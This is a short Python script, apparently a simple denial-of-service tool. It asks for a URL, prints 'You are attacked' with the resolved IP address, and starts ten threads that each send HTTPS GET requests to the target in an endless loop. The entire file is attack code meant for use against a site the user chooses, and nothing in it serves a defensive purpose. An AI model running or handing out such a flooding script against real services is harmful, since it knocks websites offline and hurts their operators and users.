import sys
import subprocess
import threading
import importlib.util

if importlib.util.find_spec("requests") is None:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    
import requests
import os
import socket
    
os.system("cls" or "clear")

url = input("\nEnter URL: ")

host = socket.gethostbyname(url)

print("\nYou are attacked : ", host)

def user1():
    while True:

        print(requests.get("https://"+ url))

def user2():
    while True:

        print(requests.get("https://"+ url))

def user3():
    while True:

        print(requests.get("https://"+ url))

def user4():
    while True:

        print(requests.get("https://"+ url))

def user5():
    while True:

        print(requests.get("https://"+ url))

def user6():
    while True:

        print(requests.get("https://"+ url))

def user7():
    while True:

        print(requests.get("https://"+ url))

def user8():
    while True:

        print(requests.get("https://"+ url))

def user9():
    while True:

        print(requests.get("https://"+ url))

def user10():
    while True:

        print(requests.get("https://"+ url))

t1 = threading.Thread(target=user1)
t2 = threading.Thread(target=user2)
t3 = threading.Thread(target=user3)
t4 = threading.Thread(target=user4)
t5 = threading.Thread(target=user5)
t6 = threading.Thread(target=user6)
t7 = threading.Thread(target=user7)
t8 = threading.Thread(target=user8)
t9 = threading.Thread(target=user9)
t10 = threading.Thread(target=user10)

t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
t6.start()
t7.start()
t8.start()
t9.start()
t10.start()

t1.join()
t2.join()
t3.join()
t4.join()
t5.join()
t6.join()
t7.join()
t8.join()
t9.join()
t10.join()
